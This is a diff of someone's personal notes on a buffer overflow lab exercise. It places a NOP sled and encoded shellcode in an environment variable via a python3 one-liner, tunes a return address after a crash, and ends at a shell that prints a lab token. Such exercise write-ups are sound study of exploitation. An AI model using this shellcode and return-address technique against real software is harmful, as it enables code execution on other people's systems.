@@ -125,9 +125,9 @@ The new shellcode is this
 I am not using echo here instead I am using python 
 
 
-export SHELLCODE=$(python3 -c '
+export SC=$(python3 -c '
 import sys
-buf  = b"\x90" * 100
+buf  = b"\x90" * 100   # NOP sled makes address guessing easier
 buf += b"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e"
 buf += b"\x81\x76\x0e\xa4\x8c\x15\x84\x83\xee\xfc\xe2\xf4"
 buf += b"\xce\x87\x4d\x1d\xf6\xea\x7d\xa9\xc7\x05\xf2\xec"
@@ -136,6 +136,8 @@ buf += b"\x4c\x84\x15\x84\xa4\xa3\x77\xed\xca\xa3\x66\xec"
 buf += b"\xa4\xdb\x46\x0d\x45\x41\x95\x84"
 sys.stdout.buffer.write(buf)
 ')
+
+
 
 https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
 
@@ -151,3 +153,40 @@ SC is at `0xffffde4f` but that includes the `SC=` prefix (3 bytes)
 ![[Pasted image 20260701190919.png]]
 
 ![[Pasted image 20260701191138.png]]
+
+# Now trying this on concat_noaslr
+
+this has to be outside gdb 
+
+add environment variable again 
+
+export SC=$(python3 -c '
+import sys
+buf  = b"\x90" * 100   # NOP sled makes address guessing easier
+buf += b"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e"
+buf += b"\x81\x76\x0e\xa4\x8c\x15\x84\x83\xee\xfc\xe2\xf4"
+buf += b"\xce\x87\x4d\x1d\xf6\xea\x7d\xa9\xc7\x05\xf2\xec"
+buf += b"\x8b\xff\x7d\x84\xcc\xa3\x77\xed\xca\x05\xf6\xd6"
+buf += b"\x4c\x84\x15\x84\xa4\xa3\x77\xed\xca\xa3\x66\xec"
+buf += b"\xa4\xdb\x46\x0d\x45\x41\x95\x84"
+sys.stdout.buffer.write(buf)
+')
+
+I can see it in sc 
+![[Pasted image 20260701232145.png]]
+
+I got a segmentation fault 
+![[Pasted image 20260701232312.png]]
+
+will need to change the address
+
+![[Pasted image 20260701232558.png]]
+
+since it was crashing i went lower 
+
+![[Pasted image 20260701232658.png]]
+ret_addr = b"\x42\xde\xff\xff"
+
+sh-5.3$ win
+Congratulations! Submit this token: 22-z2dFw2LY8DGDDmo9ljntEg-22
+22-z2dFw2LY8DGDDmo9ljntEg-22
